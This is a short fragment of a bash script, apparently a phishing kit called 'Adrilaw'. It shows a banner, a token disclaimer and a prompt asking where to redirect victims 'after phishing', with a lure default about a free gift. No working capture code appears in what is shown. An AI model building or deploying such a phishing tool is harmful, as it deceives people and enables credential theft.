...
| |_| | | | | | (_) | (__|   < 
 ...
 v1.0"
printf "${GREEN}"
print_centered "Adrilaw"
printf "${BLUE}"
print_centered "Disclaimer:"
print_centered "This is only for good purpose."
print_centered "Do not Use This TO HARM OR DO ILLGEAL PURPOSE."
...
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m click on money.com to win free gift \e[0m\e[1;33m): \e[0m'
read redirect
